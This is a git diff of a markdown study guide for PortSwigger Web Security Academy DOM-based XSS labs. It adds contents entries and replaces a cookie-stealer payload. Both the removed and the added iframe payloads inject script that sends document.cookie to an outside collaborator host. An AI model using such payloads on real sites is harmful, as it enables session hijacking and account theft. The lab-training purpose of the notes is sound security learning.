@@ -71,6 +71,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
   
 ## DOM-Based XSS  
 
+[Identify DOM-XSS](#identify-dom-xss)  
 [Vulnerable AngularJS](#vuln-angularjs)  
 [Document Write Location search](#doc-write-location-search)  
 [Dom Invader](#dom-invader)  
@@ -78,6 +79,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 [DOM XSS AddEventListener JavaScript URL](#dom-xss-addeventlistener-javascript-url)  
 [DOM XSS AddEventListener Ads Message](#dom-xss-addeventlistener-ads-message)  
 [Reflected DOM Cookie Stealer](#dom-cookie-stealer)  
+[DOM-XSS LastviewedProduct Cookie](#dom-xss-lastviewedproduct-cookie)  
 
 ### Identify DOM-XSS  
 
@@ -271,7 +273,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 >Image show the request using search function to send the document.cookie value in base64 to collaboration server.  
 
-![Reflected DOM-XSS json cookie stealer](images/reflected-dom-xss-json-cookie-stealer.png)  
+![Reflected DOM-XSS JSON cookie stealer](images/reflected-dom-xss-json-cookie-stealer.png)  
 
 [PortSwigger Lab: Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)  
 
@@ -284,7 +286,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 >Testing the escape out of of the script string for the value of **document.location** using ```/product?productId=1&'>fuzzer```. Note that **document.location** value cannot be URL encoded.  
 
 ```html
-<iframe src="https://0a8f001a04b42ecdc063d67e0024004f.web-security-academy.net/product?productId=1&'><script>document.location=`http://i5oa9o285mz7gwkn8jxpwj61nstjh95y.oastify.com/?dc=`+document.cookie</script>" onload="if(!window.x)this.src='https://0a8f001a04b42ecdc063d67e0024004f.web-security-academy.net';window.x=1;">
+<iframe src="https://TARGET.net/product?productId=1&'><script>fetch(`https://COLLABORATOR.com/?dc=`+btoa(document.cookie))</script>" onload="https://TARGET.net/">
 </iframe>
 ```  
 
